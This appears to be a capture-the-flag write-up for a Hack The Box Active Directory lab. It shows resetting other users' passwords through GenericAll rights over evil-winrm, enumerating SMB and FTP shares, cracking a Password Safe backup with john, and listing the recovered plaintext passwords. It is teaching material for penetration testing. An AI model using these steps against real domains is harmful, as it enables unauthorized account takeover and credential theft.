
The user OLIVIA@ADMINISTRATOR.HTB has GenericAll permissions to the user MICHAEL@ADMINISTRATOR.HTB.

Olivia can winrm and change Michaels password:

`evil-winrm -i 10.129.229.8 -u 'Olivia' -p 'ichliebedich'`

`Set-ADAccountPassword michael -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose`

```powershell
*Evil-WinRM* PS C:\Users> Set-ADAccountPassword michael -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose

Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Michael Williams,CN=Users,DC=administrator,DC=htb".
```

new creds: michael:Password123!

---

dn: CN=Michael Williams,CN=Users,DC=administrator,DC=htb
memberOf: CN=<font color=red>Remote Management Users</font>,CN=Builtin,DC=administrator,DC=htb
sAMAccountName: michael

The user MICHAEL@ADMINISTRATOR.HTB has the capability to change the user BENJAMIN@ADMINISTRATOR.HTB's password without knowing that user's current password.

Michael can winrm and change Benjamins password:

`evil-winrm -i 10.129.229.8 -u 'michael' -p 'Password123!'`

`Set-ADAccountPassword Benjamin -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose`

```powershell
*Evil-WinRM* PS C:\Users\michael\Documents> Set-ADAccountPassword Benjamin -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose
Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb".
```

new creds: michael:Password123!

---

dn: CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb
memberOf: CN=<font color=red>Share Moderators</font>,CN=Users,DC=administrator,DC=htb
sAMAccountName: benjamin

Michael in a member of a group called Share Moderators. Let's check him permissions on smb and ftp. Also what are his permissions in the filesystem.

```sh
┌──(fixit42㉿kali)-[~]
└─$ nxc smb 10.129.229.8 -u 'benjamin' -p 'Password123!' --shares
SMB         10.129.229.8    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.8    445    DC               [+] administrator.htb\benjamin:Password123! 
SMB         10.129.229.8    445    DC               [*] Enumerated shares
SMB         10.129.229.8    445    DC               Share           Permissions     Remark
SMB         10.129.229.8    445    DC               -----           -----------     ------
SMB         10.129.229.8    445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.8    445    DC               C$                              Default share
SMB         10.129.229.8    445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.8    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.8    445    DC               SYSVOL          READ            Logon server share 
```
nothing special

```sh
┌──(fixit42㉿kali)-[~]
└─$ ftp 10.129.229.8  
Connected to 10.129.229.8.
220 Microsoft FTP Service
Name (10.129.229.8:fixit42): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||64465|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> 
```

get all files from the ftp server
`wget -m --ftp-user=Benjamin --ftp-password='Password123!' ftp://10.129.229.8/`

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ file Backup.psafe3   
Backup.psafe3: Password Safe V3 database
```

installing passwordsafe
```
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ sudo apt install passwordsafe 
```

pwsafe

![[Images/Pasted image 20250813152333.png]]

password required

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ pwsafe2john Backup.psafe3 
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

```
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ pwsafe2john Backup.psafe3 > pwsafe.hash
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash
Created directory: /home/fixit42/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-08-13 15:26) 3.333g/s 27306p/s 27306c/s 27306C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![[Images/Pasted image 20250813153353.png]]

We got the passwords for three new users:

alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur

dn: CN=Emily Rodriguez,CN=Users,DC=administrator,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb
sAMAccountName: emily

emma is a winrm user and we saw she has a user directory

